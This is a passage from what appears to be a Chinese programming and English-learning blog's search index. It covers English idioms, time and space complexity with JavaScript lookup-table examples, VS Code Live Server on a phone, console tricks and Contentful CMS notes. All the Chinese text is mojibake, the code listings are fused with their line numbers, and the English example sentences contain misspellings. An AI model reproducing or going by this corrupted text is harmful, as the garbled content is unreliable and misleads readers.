ç•¶ä½œæ˜¯æˆ‘çš„æœ‹å‹ã€‚ å°å¿ƒè¬¹æ… beV careful + ofï¼ˆæ¥ç’°å¢ƒä¸­å¯èƒ½çš„å±éšªã€å¨è„…ï¼‰People need to be careful of snacks on the mountain.äººå€‘éœ€è¦å°å¿ƒåœ¨å±±ä¸Šçš„è›‡ã€‚ beV careful + withï¼ˆæ¥éœ€è¦è¬¹æ…è™•ç†çš„äººäº‹ç‰©ï¼‰Alex is careful with the kittens. He is trying not to hurt them.ä»–æŠŠé›»è…¦ç•¶ä½œæ˜¯ä»–çš„ç”Ÿå‘½ã€‚ ä¸ä¹…ä¹‹å‰It is not long ago that they arrived in Britain.ä»–å€‘æ˜¯ä¸ä¹…å‰åˆ°è‹±åœ‹çš„ã€‚ ç‰¹åœ°My girlfriend went out of her way to make sushi for me.æˆ‘å¥³æœ‹å‹ç‰¹åœ°ç‚ºæˆ‘åšäº†å£½å¸ã€‚ çœ‹ä¾† It seems likeIt seems like their marriage is over.ä»–å€‘çš„å©šå§»å¥½åƒçµæŸäº†ã€‚ It looks likeIt looks like David will be able to come too.çœ‹ä¾†å¤§è¡›å¥½åƒä¹Ÿèƒ½ä¾†ã€‚ It seems thatIt seems that light energy will be an important subject of scientific research in the future.çœ‹ä¾†å…‰èƒ½åœ¨æœªä¾†çš„ç§‘å­¸ç ”ç©¶ä¸­æœƒæ˜¯ä¸€å€‹å¾ˆé‡è¦çš„èª²é¡Œã€‚ It appears thatIt appears that you might be right.çœ‹ä¾†ä½ å¯èƒ½æ˜¯å°çš„ã€‚ æ—¢ä½¿ç”¨ä¾†å¼•å°è™›æ“¬èªæ°£ã€å‡å®šå¥å­ã€æˆ–ä¸è¦‹å¾—çœŸå¯¦çš„æƒ…æ³ã€‚ People can still go to colledge, even if they are not rich.å°±ç®—(æ—¢ä½¿)ä¸æ˜¯å¾ˆæœ‰éŒ¢ï¼Œä¸€èˆ¬äººé‚„æ˜¯å¯ä»¥è®€å¤§å­¸ã€‚ æ ¹æ“š When they reach here they complain that they are not being paid as per the agreement.ä»–å€‘ä¾†åˆ°é€™è£¡å¾Œï¼Œä»–å€‘æŠ±æ€¨å·¥è³‡æ²’æœ‰æ ¹æ“šå”è­°ä¾†ç™¼æ”¾ã€‚ You should transfer the deposit to our bank account before we start the production as per agreement.æ ¹æ“šå”è­°ï¼Œä½ æ‡‰è©²åœ¨æˆ‘å€‘é–‹å§‹ç”Ÿç”¢å‰æŠŠè¨‚é‡‘è½‰åˆ°æˆ‘å€‘çš„éŠ€è¡Œæˆ¶é ­ã€‚ é€™èªªå¾—éå»If I were rich, I wouldnâ€™t be here. it makes sense.å¦‚æœæˆ‘å¾ˆæœ‰éŒ¢æˆ‘å°±ä¸æœƒåœ¨é€™è£¡äº†ã€‚å¥½åƒæ˜¯é€™æ¨£ã€‚ æŒºæœ‰é“ç†çš„Iâ€™m not reponsible for her, she ainâ€™t my girlfriend anyway. That's reasonable.æˆ‘æ²’æœ‰ç¾©å‹™ç‚ºå¥¹æ“å¿ƒï¼Œå¥¹åˆä¸æ˜¯æˆ‘å¥³æœ‹å‹ã€‚æŒºæœ‰é“ç†ã€‚ æ¯«ç„¡ç–‘å•Warriros is gonna win. No doubt.å‹‡å£«éšŠè¦è´äº†ã€‚æ¯«ç„¡ç–‘å• ä½ èªªçš„æœ‰é»é“ç†The restaraunt is suck. You've got a point here.é‚£é–“é¤å»³éœæ–ƒäº†ã€‚ä½ èªªçš„æœ‰é»é“ç†ã€‚ æˆ‘å¾ˆæ„Ÿæ¿€é‚£ä»¶äº‹appreciate æ˜¯ç”¨ä¾†æ„Ÿè¬ä¸€ä»¶äº‹æƒ…ï¼Œæ‰€ä»¥ä¸å¯ä»¥èªªï¼š I apprecaite you.ï¼Œè¨˜å¾—è¦åœ¨ apprecaite å¾Œé¢åŠ ä¸Šä¸€ä»¶äº‹æƒ…ï¼ˆåè©æˆ–å‹•åè©ï¼‰ I really appreciate that.æˆ‘å¾ˆæ„Ÿæ¿€é‚£ä»¶äº‹ è¬è¬ä½ é»å‡ºå•é¡ŒYou better change you attitude or people would see you as an jerk. Thank you for pointing that out.ä½ æœ€å¥½æ”¹è®Šä½ çš„æ…‹åº¦ï¼Œå¦å‰‡åˆ¥äººæœƒè¦ºå¾—ä½ æ˜¯å€‹æ··å¸³ã€‚è¬è¬ä½ é»å‡ºå•é¡Œã€‚ è®“æˆ‘æ¶ˆåŒ–ä¸€ä¸‹é€™ä»¶äº‹Just give me a second. I need to get my head around this.çµ¦æˆ‘ä¸€é»æ™‚é–“ã€‚è®“æˆ‘æ¶ˆåŒ–ä¸€ä¸‹é€™ä»¶äº‹ã€‚","link":"/2021/07/29/common-english-idioms/"},{"title":"æ·ºè«‡æ™‚é–“è¤‡é›œåº¦èˆ‡ç©ºé–“è¤‡é›œåº¦","text":"æ¯æ¬¡å¿µé€™å…©å€‹è©éƒ½æ„Ÿè¦ºå¾ˆé…·ã€‚ æ™‚é–“è¤‡é›œåº¦ç°¡å–®ä¾†èªªå°±æ˜¯ä¸€å€‹æ¼”ç®—æ³•å¹³å‡éœ€è¦å¤šå°‘ã€Œæ™‚é–“ã€ä¾†å®Œæˆã€‚ ä½†æ™‚é–“ä¸¦ä¸æ˜¯ä¸€å€‹å¾ˆå¥½çš„æŒ‡æ¨™ï¼Œç•¢ç«Ÿä½ å®¶é›»è…¦è·Ÿ NASA çš„è¶…ç´šé›»è…¦å®Œå…¨æ˜¯ä¸åŒç­‰ç´šçš„æ±è¥¿å§ï¼Ÿæ‰€ä»¥æ™‚é–“ä¸Šçš„è½å·®ä¸€å®šå¾ˆå¤§ï¼Œå› æ­¤æ¯”è¼ƒå¥½çš„æŒ‡æ¨™æ˜¯ç”¨ã€ŒåŸ·è¡Œæ¬¡æ•¸ã€ä¾†è§£é‡‹ã€‚ ç¯„ä¾‹å‡è¨­è¦ä½ åœ¨ 1, 3, 4, 5, 9, 10 è£¡é¢æ‰¾æœ‰æ²’æœ‰ 9ï¼Œæœ€å®¹æ˜“æƒ³åˆ°çš„æ¼”ç®—æ³•å¯èƒ½æ˜¯ï¼š æ¼”ç®—æ³•ï¼šå¾é ­æ‰¾åˆ°å°¾ï¼Œçœ‹çœ‹æœ‰æ²’æœ‰ã€‚è¼¸å‡ºï¼šæœ‰ï¼ˆç¬¬äº”å€‹ï¼‰ æ‰€ä»¥æˆ‘å€‘çš„æ¼”ç®—æ³•åœ¨ 6 å€‹æ•¸å­—æ™‚è¦çœ‹ 6 æ¬¡ï¼Œæ›å¥è©±èªªå°±æ˜¯æœ‰ n å€‹æ•¸å­—å°±è¦çœ‹ n æ¬¡ã€‚ é€™æ™‚å€™çš„æ™‚é–“è¤‡é›œåº¦å°±æœƒæ˜¯ï¼šO(n) O(n) æ˜¯ä¸€å€‹å«ã€ŒBig O notationã€çš„è¡¨ç¤ºæ³•ï¼š æŠŠå®ƒæƒ³æˆæ˜¯ä¸€ç¨®é¡ä¼¼å‡½æ•¸çš„æ±è¥¿å°±å¥½ï¼Œn æ˜¯ä½ çš„è¼¸å…¥å€¼ï¼Œè€Œ O(n) çš„è¼¸å‡ºçµæœä»£è¡¨ã€ŒåŸ·è¡Œæ¬¡æ•¸ã€ï¼š O(1) å¸¸æ•¸ï¼Œä¸è«– n æ˜¯å¤šå°‘éƒ½åªéœ€è¦ 1 å€‹æ­¥é©Ÿï¼ˆæœ€å±Œçš„æ¼”ç®—æ³•ï¼‰ O(n) ç•¶ n æ˜¯å¤šå°‘å°±è¦ n å€‹æ­¥é©Ÿï¼ˆå‰›å‰›çš„ç¯„ä¾‹ï¼‰ O(n^2) n çš„ 2 æ¬¡æ–¹ï¼Œæ¯ç•¶ n å¢åŠ  1ï¼Œå°±éœ€è¦ n^2 æ­¥é©Ÿï¼ˆn=1 =&gt; 1, n=2 =&gt; 4, â€¦ , n=10 =&gt; 100ï¼‰ O(2^n) 2 çš„ n æ¬¡æ–¹ï¼Œæ¯ç•¶ n å¢åŠ  1ï¼Œå°±éœ€è¦ 2^n æ­¥é©Ÿï¼ˆn=1 =&gt; 2, n=2 =&gt; 4, â€¦ , n=10 =&gt; 1024ï¼‰ O(n!) n éšå±¤ï¼Œæ¯ç•¶ n å¢åŠ  1ï¼Œå°±éœ€è¦ n! æ­¥é©Ÿï¼ˆn=1 =&gt; 1, n=2 =&gt; 2, â€¦ , n=10 =&gt; 3628800ï¼‰ å¯¦ä½œåœ¨çŸ¥é“æ™‚é–“è¤‡é›œåº¦å¾Œï¼Œæˆ‘å€‘å¯ä»¥ä¾†å¯¦ä½œå‰›å‰›çš„æ¼”ç®—æ³•ï¼š 1234567891011121314// æ™‚é–“è¤‡é›œåº¦ o(n) =&gt; n æœ‰å¹¾å€‹å°±è¦çœ‹å¹¾å€‹æ•¸å­— function hasNumber(numbers, searchNumber) { let result = false // çœ‹æ¯ä¸€å€‹æ•¸å­—ï¼Œæœ‰å°±å¡«å…¥ true for (let number of numbers) { if (number === searchNumber) { result = true } } // å›å‚³çµæœ return result}const numbers = [1, 3, 4, 5, 9, 10]console.log(hasNumber(numbers, 10)) // true ç¾åœ¨å¦‚æœè¦æŸ¥è©¢çš„æ•¸å­—è®Šå¤šäº†å‘¢ï¼Ÿå¦‚æœæ²¿ç”¨å‰›å‰›çš„æ¼”ç®—æ³•ï¼Œæ™‚é–“è¤‡é›œåº¦æœƒè®Šæˆï¼šO(n*m) 12345678910111213141516171819202122// æ™‚é–“è¤‡é›œåº¦ o(n*m) =&gt; n æœ‰å¹¾å€‹å°±è¦çœ‹å¹¾å€‹æ•¸å­—ï¼ŒæŸ¥ m æ¬¡å°±è¦åšå¹¾æ¬¡æŸ¥è©¢çš„å‹•ä½œfunction hasNumber(numbers, searchNums) { let result = [] // æŸ¥è©¢å¹¾æ¬¡ for(let i=0; i&lt;searchNums.length; i++) { // çœ‹æ¯ä¸€å€‹æ•¸å­— for (let number of numbers) { // æ‰¾åˆ°å°±å¡«å…¥ true if (number === searchNums[i]) { result[i] = true } } // æ‰¾ä¸åˆ°å°±å¡«å…¥ false if (!result[i]) { result[i] = false } } // å›å‚³çµæœ return result}const numbers = [1, 3, 4, 5, 9, 10]console.log(hasNumber(numbers, [2, 3, 5, 9])) // [ false, true, true, true ] è©³ç´°çš„æ­¥é©Ÿå¯ä»¥åƒè€ƒä¸‹é¢ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// æŸ¥ç¬¬ä¸€æ¬¡ï¼š2i 0number: 1searchNums: 2number: 3searchNums: 2number: 4searchNums: 2number: 5searchNums: 2number: 9searchNums: 2number: 10searchNums: 2// æŸ¥ç¬¬äºŒæ¬¡ï¼š1i 1number: 1searchNums: 3number: 3searchNums: 3number: 4searchNums: 3number: 5searchNums: 3number: 9searchNums: 3number: 10searchNums: 3// æŸ¥ç¬¬ä¸‰æ¬¡ï¼š2i 2number: 1searchNums: 5number: 3searchNums: 5number: 4searchNums: 5number: 5searchNums: 5number: 9searchNums: 5number: 10searchNums: 5// æŸ¥ç¬¬ä¸‰æ¬¡ï¼š3i 3number: 1searchNums: 9number: 3searchNums: 9number: 4searchNums: 9number: 5searchNums: 9number: 9searchNums: 9number: 10searchNums: 9 ç©ºé–“è¤‡é›œåº¦å‰é¢è¬›æ™‚é–“ï¼Œç¾åœ¨è¬›ç©ºé–“ï¼Œæ‰€è¬‚ç©ºé–“è¤‡é›œåº¦æ˜¯æŒ‡ï¼šä¸€å€‹æ¼”ç®—æ³•å¹³å‡éœ€è¦å¤šå°‘ã€Œç©ºé–“ã€ä¾†å®Œæˆ åœ¨å‰›å‰›æ‰¾æ•¸å­—çš„ç¯„ä¾‹ä¸­ï¼Œæˆ‘å€‘çš„æ¼”ç®—æ³•ä¸¦æ²’æœ‰ã€Œå„²å­˜ã€ä»»ä½•è³‡è¨Šï¼Œæ‰€ä»¥ç©ºé–“è¤‡é›œåº¦å°±æ˜¯ 0ã€‚ ç„¶è€Œï¼Œåœ¨å‰é¢å¯¦ä½œéƒ¨åˆ†ä¸­å¯ä»¥ç™¼ç¾åˆ°ç•¶æƒ³æŸ¥è©¢ã€Œå¤šå€‹æ•¸å­—ã€æ™‚ï¼Œé€™å¥—æ¼”ç®—æ³•çš„æ™‚é–“è¤‡é›œåº¦å°±æœƒè®Šæˆ O(n*m)ï¼Œæ‡‰è©²æœ‰æ›´å¥½çš„ä½œæ³•æ‰å°ï¼Ÿç•¢ç«Ÿæ²’æœ‰å¿…è¦æ¯æ¬¡éƒ½å¾é ­æ‰¾åˆ°å°¾é˜¿ï¼ ä»¥ç©ºé–“æ›å–æ™‚é–“èˆ‡å…¶æ¯æ¬¡éƒ½å¾é ­æ‰¾åˆ°å°¾ï¼Œä¸å¦‚å»ºç«‹ä¸€å€‹ã€Œè¡¨æ ¼ã€ï¼Œè¦æŸ¥æ•¸å­—æ™‚åªéœ€è¦ã€Œä¸€å€‹æ­¥é©Ÿã€ï¼šæŸ¥è¡¨æ ¼ æœ‰å€‹å¾ˆç¶“å…¸çš„ä¾‹å­ï¼šè²»å¼æ•¸åˆ— ç¯„ä¾‹åœ¨ 1, 3, 4, 5, 9, 10 è£¡é¢æ‰¾æœ‰æ²’æœ‰ 2, 3, 5, 9 é€™äº›æ•¸å­—ï¼š æ¼”ç®—æ³•ï¼š å…ˆå»ºç«‹ä¸€å€‹æ•¸å­—è¡¨ æŠŠæœ‰å‡ºç¾çš„æ•¸å­—è¨˜ä¸‹ä¾†ï¼ˆ1, 3, 4, 5, 9, 10ï¼‰ è¦æ‰¾æ•¸å­—å°±ç›´æ¥æŸ¥è¡¨æ ¼ è¼¸å‡ºï¼š 2 =&gt; æ²’æœ‰ï¼ˆæŸ¥è¡¨ Falseï¼‰3 =&gt; æœ‰ï¼ˆæŸ¥è¡¨ Trueï¼‰5 =&gt; æœ‰ï¼ˆæŸ¥è¡¨ Trueï¼‰9 =&gt; æœ‰ï¼ˆæŸ¥è¡¨ Trueï¼‰ é€™æ™‚å¾Œæ™‚é–“è¤‡é›œåº¦å°±å¾å‰›å‰›çš„ O(n*m) è®Šæˆ O(n+m)ï¼Œä½†åŒæ™‚ä¹Ÿåˆ©ç”¨äº†ã€Œç©ºé–“ã€ä¾†å„²å­˜ä¸€äº›è³‡è¨Šï¼Œé€™å°±å«ä½œã€Œä»¥ç©ºé–“æ›å–æ™‚é–“ã€ã€‚ å¯¦ä½œä¸€æ¨£ä¾†å¯¦ä½œä¸€ä¸‹é€™å¥—æ¼”ç®—æ³•ï¼š 1234567891011121314151617181920212223242526272829// æ™‚é–“è¤‡é›œåº¦ o(n+m)// =&gt; å»ºç«‹è¡¨æ ¼è¦å…ˆçœ‹ n å€‹æ•¸å­—// =&gt; æŸ¥ m æ¬¡ = æŸ¥å¹¾æ¬¡è¡¨æ ¼function hasNumber(numbers, searchNumbers) { let result = [] // æ‰€æœ‰çš„æ•¸å­—è¡¨æ ¼ let table = {} // å»ºç«‹ 1~100 çš„è¡¨æ ¼ for (let i=1; i&lt;=100; i++) { table[i] = false } // æŠŠå‡ºç¾çš„æ•¸å­—å„²å­˜èµ·ä¾† for (let i=0; i&lt;numbers.length; i++) { table[numbers[i]] = true } // æ‰¾æ•¸å­—ï¼Œç›´æ¥æŸ¥è¡¨ for (searchNumber of searchNumbers) { // æœ‰å‡ºç¾åœ¨è¡¨æ ¼è£¡å¡«å…¥ trueï¼Œæ²’æœ‰å‰‡å¡«å…¥ false if (table[searchNumber]) { result.push(true) } else { result.push(false) } } return result}const numbers = [1, 3, 4, 5, 9, 10]const searchNumbers = [2, 3, 5, 9]console.log(hasNumber(numbers, searchNumbers)) // [ false, true, true, true ] è©³åˆ—æ­¥é©Ÿçš„è©±æœƒæ˜¯é€™æ¨£ï¼š 123456789101112131415161718192021222324252627282930313233343536371. å»ºç«‹æ•¸å­—è¡¨æ ¼ï¼š{ '1': false, '2': false, '3': false, '4': false, '5': false, '6': false, '7': false, '8': false, '9': false, '10': false, ...}2. æŠŠå‡ºç¾éçš„æ•¸å­—å„²å­˜èµ·ä¾†ï¼š{ '1': true, '2': false, '3': true, '4': true, '5': true, '6': false, '7': false, '8': false, '9': true, '10': true, ...}3. æŸ¥è¡¨æ ¼è¦æ‰¾çš„æ•¸å­—ï¼š2ï¼ŒæŸ¥è¡¨æ ¼ =&gt; falseè¦æ‰¾çš„æ•¸å­—ï¼š3ï¼ŒæŸ¥è¡¨æ ¼ =&gt; trueè¦æ‰¾çš„æ•¸å­—ï¼š5ï¼ŒæŸ¥è¡¨æ ¼ =&gt; trueè¦æ‰¾çš„æ•¸å­—ï¼š9ï¼ŒæŸ¥è¡¨æ ¼ =&gt; trueè¼¸å‡ºçµæœï¼š[ false, true, true, true ] å…¶å¯¦ä¹Ÿæœ‰æ›´å¿«çš„ä½œæ³•ï¼Œç›´æ¥æŠŠã€Œæœ‰å‡ºç¾çš„æ•¸å­—ã€è¨˜èµ·ä¾†å°±å¥½ï¼š 12345678910111213141516171819202122function hasNumber(numbers, searchNumbers) { let result = [] // å„²å­˜æ‰€æœ‰æ•¸å­— let table = {} // å»ºç«‹è¡¨æ ¼ï¼ˆæŠŠæœ‰å‡ºç¾çš„æ•¸å­—å­˜èµ·ä¾†ï¼‰ for (number of numbers) { table[number] = true } // æ‰¾æ•¸å­—ï¼ˆç›´æ¥æŸ¥è¡¨ï¼‰ for (searchNumber of searchNumbers) { // æœ‰å‡ºç¾åœ¨è¡¨æ ¼è£¡å¡«å…¥ trueï¼Œæ²’æœ‰å‰‡å¡«å…¥ false if (table[searchNumber]) { result.push(true) } else { result.push(false) } } return result}const numbers = [1, 3, 4, 5, 9, 10]const searchNumbers = [2, 3, 5, 9]console.log(hasNumber(numbers, searchNumbers)) // [ false, true, true, true ] æ­¥é©Ÿè·Ÿå‰›å‰›å·®ä¸å¤šï¼Œåªå·®åœ¨è¡¨æ ¼å»ºç«‹çš„å…§å®¹è€Œå·²ï¼š 123456789101112131415161. å»ºç«‹è¡¨æ ¼{ '1': true, '3': true, '4': true, '5': true, '9': true, '10': true }2. æŸ¥è¡¨æ ¼searchNumber: 3searchNumber: 5searchNumber: 9è¼¸å‡ºçµæœï¼š[ false, true, true, true ] ä»¥ä¸Šå°±æ˜¯é—œæ–¼æ™‚é–“è¤‡é›œåº¦èˆ‡ç©ºé–“è¤‡é›œåº¦çš„ç°¡å–®è§£èªªï¼Œè¬è¬è§€çœ‹ã€‚","link":"/2022/01/17/complexity-analysis/"},{"title":"è®“æ‰‹æ©Ÿé€£åˆ° VS-Code ä¸Šçš„ Live Server","text":"æ‡¶äººåŒ…ã€‚ å‚™è¨»è¦ç”¨é€™å€‹æ–¹æ³•çš„å‰ææ˜¯ã€Œæ‰‹æ©Ÿè·Ÿé›»è…¦é€£åˆ°åŒä¸€å€‹ wifiã€ï¼Œæ›å¥è©±èªªå°±æ˜¯åœ¨ç›¸åŒå…§ç¶²è£¡é¢æ‰å¯ä»¥äº’é€£ã€‚ æµç¨‹ ä¸‹è¼‰ Live Server å¥—ä»¶ åœ¨ vs-code çš„è¨­å®š JSON æª”åŠ ä¸Šé€™æ®µï¼š 1\"liveServer.settings.useWebExt\": true, åœ¨ vs-code ä¸Šæ‰“é–‹ liver-server å¾Œï¼Œç”¨æ‰‹æ©Ÿè¼¸å…¥é›»è…¦çš„ IP ä½å€ï¼š å‚™è¨»ï¼šä½ å¯ä»¥ç”¨ CLI çš„ ipconfig æŒ‡ä»¤ä¾†æŸ¥ IP ä½å€ 1ipconfig è¼¸å‡ºçµæœï¼ˆæˆ‘åªæˆªé‡é»ï¼‰ï¼š 12345678Wireless LAN adapter Wi-Fi: Connection-specific DNS Suffix . : IPv4 Address. . . . . . . . . . . : 192.168.1.107 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : fe80::127b:efff:fe16:5d26%20 192.168.1.1 åœ¨æ‰‹æ©Ÿç¶²å€è¼¸å…¥ IPv4 Address çš„ä½å€å°±è¡Œå›‰ã€‚","link":"/2022/01/31/connect-to-live-server/"},{"title":"ä½ ä¸çŸ¥é“çš„ console å°æŠ€å·§","text":"ç„¡èŠç¿»æ›¸æ™‚çœ‹åˆ°çš„ï¼Œç­†è¨˜ä¸€ä¸‹ã€‚ å„ç¨® log çš„æ–¹å¼123console.info('testing');console.error('I\\'m a error');console.warn('Warning'); ä¸»è¦æ˜¯å‰é¢çš„ icon ä¸ä¸€æ¨£ï¼Œä¹Ÿèƒ½é€éå´é‚Šæ””ä¾†ç¯©é¸è¨Šæ¯ï¼š ç¾¤çµ„èµ·ä¾†group å¯ä»¥æŠŠæ±è¥¿ç¾¤çµ„èµ·ä¾†ï¼š 123456console.group('my logs');console.log('A: yoyoyo~~');console.log('B: oppps!!');console.log('C: warning!!');// åˆ°é€™é‚ŠçµæŸconsole.groupEnd(); ç”¨è¡¨æ ¼ä¾†å‘ˆç¾ç‰©ä»¶è·Ÿé™£åˆ—é€™å€‹æ„å¤–çš„å¾ˆå¥½ç”¨ï¼š 123456789101112131415const people = [ { name: 'PeaNu', age: 20 }, { name: 'PPB', age: 22 }, { name: 'Cris', age: 30 }];console.table(people); æ¢ä»¶å¼çš„é¡¯ç¤º logç•¶ç¬¬ä¸€å€‹åƒæ•¸æ˜¯ false æ™‚å°±é¡¯ç¤ºå¾Œé¢çš„è¨Šæ¯ï¼š 1console.assert(false, 'has a problem here'); æ‰€ä»¥å¯ä»¥é€™æ¨£é‹ç”¨ï¼š 12let n = 100;console.assert(n &lt; 10, 'n is bigger than 10'); æ¸¬æ™‚æ™‚é–“ç•¶ä½ æƒ³æ¸¬è©¦ä¸€æ®µ code çš„åŸ·è¡Œæ™‚é–“æ™‚å¯ä»¥ç”¨é€™æ‹›ï¼š 123console.time();const n = Math.random();console.timeEnd(); è¼¸å‡ºçµæœå°±æœƒæ˜¯ï¼š 1default: 0.010009765625 ms","link":"/2022/03/03/console-tricks/"},{"title":"Contentful æ‡¶äººåŒ…","text":"å­¸ Next æ™‚ä½¿ç”¨çš„ä¸€ç¨®å·¥å…·ï¼Œé‚„è »ä¸éŒ¯ç”¨çš„ã€‚ What is this?Contentful æ˜¯ä¸€ç¨® CMSï¼ˆContent Management Systemï¼‰ï¼Œè€Œä¸”æ˜¯ã€ŒHeadlessã€çš„ CMSã€‚å»ºè­°å…ˆåƒè€ƒé€™å€‹å½±ç‰‡ç†è§£ä¸€ä¸‹ Headless è·Ÿä¸€èˆ¬çš„ CMS å·®åˆ¥åœ¨å“ªï¼Ÿæˆ‘è¦ºå¾—è§£é‡‹çš„å¾ˆæ¸…æ¥šã€‚ ç°¡å–®ä¾†èªªå®ƒå°±æ˜¯ä¸€ç¨®ã€Œä»‹é¢ã€ï¼Œè®“ä½ å¯ä»¥åœ¨ä¸Šé¢ç®¡ç†å…§å®¹ï¼Œå¯¦éš›ç”¨èµ·ä¾†æœƒåƒé€™æ¨£ï¼š ç•¶æˆ‘å€‘åœ¨ Contentful å»ºç«‹å¥½å…§å®¹å¾Œï¼Œæœƒé€é APIï¼ˆAKA Contentful SDKï¼‰ä¾†æŠŠå…§å®¹ä¸²æ¥åˆ°å‰ç«¯ä¸Šã€‚ å› ç‚ºæ˜¯ Headlessï¼Œä»£è¡¨å‰ç«¯çš„éƒ¨åˆ†æ˜¯å¯ä»¥è‡ªç”±ç™¼æ®çš„ï¼Œä½ å¯ä»¥æ‹¿ä¾†ä¸²æ¥åˆ°ä»»ä½•ä½ æƒ³è¦çš„æ¡†æ¶ä¸Šï¼Œä¾‹å¦‚ React.js æˆ– Next.jsã€‚ ç¸½è€Œè¨€ä¹‹ï¼ŒContentful æ˜¯ä¸€å¥—ä¸éŒ¯ç”¨çš„ CMSï¼Œæ‰€ä»¥æ‰æœƒå¯«é€™ç¯‡ä¾†ç´€éŒ„ã€‚ åŸºæœ¬æ¦‚å¿µèˆ‡åŠŸèƒ½Spaceå¯ä»¥æƒ³æˆæ˜¯ Collection çš„æ¦‚å¿µï¼Œå°±æ˜¯ã€Œæ‹¿ä¾†æ”¾æ‰€æœ‰æ±è¥¿çš„åœ°æ–¹ã€ã€‚å…è²»å¸³æˆ¶åªæœƒæœ‰ä¸€å€‹ï¼Œè¦æœ‰å¤šå€‹çš„è©±å¿…é ˆä»˜è²»æ‰è¡Œã€‚ é›–ç„¶èªªå…è²»å¸³æˆ¶åªæœ‰ä¸€å€‹ï¼Œä¸éåªæ˜¯è¦æ‹¿ä¾†ç·´ç¿’çš„è©±ç®—æ˜¯ç¶½ç¶½æœ‰é¤˜äº†ã€‚ Content Modelç”¨ä¾†å®šç¾©å…§å®¹çš„ã€Œæ¬„ä½ã€ï¼Œä½ å¯ä»¥åœ¨é€™é‚Šå®šç¾©ï¼š å…§å®¹è©²æœ‰å“ªäº›æ¬„ä½ï¼Ÿ æ¬„ä½çš„ç¨®é¡æ˜¯æ–‡å­—ï¼Ÿé‚„æ˜¯åœ–ç‰‡ï¼Ÿç­‰ç­‰ æ¬„ä½çš„è¦å‰‡ï¼Ÿï¼ˆå¿…å¡«ã€Regexã€æª”æ¡ˆç¨®é¡ç­‰ç­‰ï¼‰ ä¾‹å¦‚èªªæˆ‘æœ‰ä¸€å€‹é£Ÿè­œçš„å…§å®¹ï¼Œé‚£å°±æœƒæœ‰é€™æ¨£çš„ Modelï¼š Contenté€™é‚Šå°±æ˜¯ã€Œç·¨è¼¯å…§å®¹ã€çš„åœ°æ–¹ï¼Œç·¨è¼¯çš„æ¬„ä½æœƒä¾ç…§ã€ŒContent Modelã€çš„è¨­å®šä¾†è®“æˆ‘å€‘å¡«å¯«ï¼š Mediaé™¤äº†æ–‡å­—ä»¥å¤–ï¼Œä½ ä¹Ÿå¯ä»¥æŠŠæœ¬æ©Ÿçš„ã€Œå¤šåª’é«”ã€å…§å®¹ï¼Œä¾‹å¦‚åœ–ç‰‡ï¼Œä¸Šå‚³åˆ° Contenful ä¸Šã€‚ ä¸Šå‚³ä»¥å¾Œå°±å¯ä»¥åœ¨ç·¨è¼¯çš„æ™‚å€™ç›´æ¥æ‹¿ä¾†ç”¨ï¼Œé€™æ¨£å°±ä¸ç”¨å†å¦å¤–æ‰¾ç¬¬ä¸‰æ–¹æœå‹™ä¾†å¹«ä½ æŠŠåœ–ç‰‡è½‰æˆ url äº†ï¼Œä¾‹å¦‚ Imgurã€‚ API ä¸²æ¥é€™é‚Šæœƒä»¥ Next ç‚ºä¾‹ã€‚ è®€å–æ‡¶äººåŒ…ï¼š createClient ä¾†è·Ÿ Contentful é€£ç·š getEntries æŠ“å–æŸå€‹ content 1234567891011121314151617181920212223import { createClient } from 'contentful'export async function getStaticProps() { const client = createClient({ space: process.env.CONTENTFUL_SPACE_ID, accessToken: process.env.CONTENTFUL_ACCESS_TOKEN }) const response = await client.getEntries({ content_type: 'recipe' }) return { props: { recipes: response.items } }}export default function Recipes({ recipes }) { console.log('props', recipes) return &lt;div className='recipe-list'&gt;Recipe List&lt;/div&gt;} è®€å–ï¼ˆæ­é… queryï¼‰ç•¶ä½ æƒ³è¦æŠ“å–ã€Œå–®ç­†ã€è³‡æ–™æ™‚å¯èƒ½å°±æœƒéœ€è¦ç”¨åˆ° queryï¼Œå¯ä»¥ç”¨ 'fields.&lt;property&gt;' çš„æ–¹å¼ä¾†æŒ‡å®šï¼š 12345678910111213141516171819202122232425import { createClient } from 'contentful'export async function getStaticProps() { const client = createClient({ space: process.env.CONTENTFUL_SPACE_ID, accessToken: process.env.CONTENTFUL_ACCESS_TOKEN }) const response = await client.getEntries({ content_type: 'recipe', // æ‰¾å‡ºç›¸åŒ slug çš„é£Ÿè­œ 'fields.slug': params.slug }) return { props: { recipes: response.items } }}export default function Recipes({ recipes }) { console.log('props', recipes) return &lt;div className='recipe-list'&gt;Recipe List&lt;/div&gt;} æ¸²æŸ“ Rich Textå¦‚æœå…§å®¹åŒ…å«ã€Œrich-textã€çš„è©±æœƒç™¼ç¾æ‹¿åˆ°çš„å…§å®¹æœƒé•·é€™æ¨£ï¼š é€™æ¨£å°±ä¸çŸ¥é“è¦æ€éº¼è¼¸å‡ºäº†å°å§ï¼Ÿ ä¸é contentful æ—©å°±å¹«ä½ æº–å‚™å¥½äº†ï¼Œåªè¦ç”¨å®ƒæä¾›çš„ @contentful/rich-text-react-renderer ä¾†è™•ç†å°±è¡Œäº†ã€‚ é™„ä¸Šå®˜ç¶²ç¯„ä¾‹ï¼š 12345678910111213141516171819202122import { documentToReactComponents } from '@contentful/rich-text-react-renderer'const document = { nodeType: 'document', data: {}, content: [ { nodeType: 'paragraph', data: {}, content: [ { nodeType: 'text', value: 'Hello world!', marks: [], data: {} } ] } ]}documentToReactComponents(document) // -&gt; &lt;p&gt;Hello world!&lt;/p&gt; é€™æ¨£å­å¯ä»¥è¼¸å‡ºæ­£ç¢º HTML æ ¼å¼çš„å…§å®¹äº†ã€‚","link":"/2022/09/16/contentful-notes/"},{"title":"æŠŠ Array-like-object è®Šæˆ Array","text":"æ„Ÿè¦ºæ˜¯è©²å­¸æœƒçš„å°æŠ€å·§ã€‚ ç°¡è¿°æˆ‘å€‘ç†Ÿæ‚‰çš„ Stringã€argumentsã€Nodelistã€HTMLCollection é€™äº›æ±è¥¿ï¼Œé›–ç„¶éƒ½å¯ä»¥ç”¨ï¼š 1234String[0]arguments[0]Nodelist[0]HTMLCollection[0] ä¾†å­˜å–ä»–å€‘ï¼Œä½†å®ƒå€‘éƒ½æ˜¯ã€ŒArray-like-objectã€ï¼Œä¸æ˜¯çœŸçš„ Arrayï¼Œæ‰€ä»¥ä¸èƒ½ç”¨ Array çš„å…§å»ºæ–¹æ³•ã€‚ 